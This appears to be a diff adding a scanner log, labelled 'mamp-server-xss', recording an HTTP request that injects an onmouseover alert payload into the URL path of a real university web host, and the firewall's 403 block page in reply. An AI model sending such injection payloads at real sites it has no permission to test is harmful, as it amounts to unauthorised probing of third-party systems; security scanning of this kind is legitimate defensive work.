@@ -1,0 +1,25 @@
+[mamp-server-xss] Dumped HTTP request for https://law.app.unimelb.edu.au/index.php/test"+onmouseover="alert(document.domain);"+style="font-size:100000px;background-color:white";
+
+
+GET /index.php/test%22%20onmouseover=%22alert%28document.domain%29;%22%20style=%22font-size:100000px;background-color:white%22; HTTP/1.1
+Host: law.app.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[mamp-server-xss] Dumped HTTP response https://law.app.unimelb.edu.au/index.php/test"+onmouseover="alert(document.domain);"+style="font-size:100000px;background-color:white";
+
+HTTP/1.1 403 Forbidden
+Connection: close
+Content-Length: 830
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Set-Cookie: visid_incap_3148830=omadxHfKRq+OD2ge735oexZyk2gAAAAAQUIPAAAAAAAxsD182M24xprCRTLKsgg5; expires=Thu, 06 Aug 2026 08:08:47 GMT; HttpOnly; path=/; Domain=.app.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_1540_3148830=W+G8XXh2F1074mxVQi5fFRZyk2gAAAAAR/BXpVrcbzxrMPHOD/tsXA==; path=/; Domain=.app.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 9-3454524-0 0NNN RT(1754493462832 8) q(0 -1 -1 -1) r(0 -1) B15(1,402,42) U24
+
+<html style="height:100%"><head><META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"><meta name="format-detection" content="telephone=no"><meta name="viewport" content="initial-scale=1.0"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script src="/faile-to-of-almost-ther-th-to-a-Racessage-and-dy" async></script></head><body style="margin:0px;height:100%"><iframe id="main-iframe" src="/_Incapsula_Resource?CWUDNSAI=23&xinfo=9-3454524-0%200NNN%20RT%281754493462832%208%29%20q%280%20-1%20-1%20-1%29%20r%280%20-1%29%20B15%281%2c402%2c42%29%20U24&incident_id=1540000460019851443-16468253333523337&edet=15&cinfo=01000000&rpinfo=0&mth=GET" frameborder=0 width="100%" height="100%" marginheight="0px" marginwidth="0px">Request unsuccessful. Incapsula incident ID: 1540000460019851443-16468253333523337</iframe></body></html>
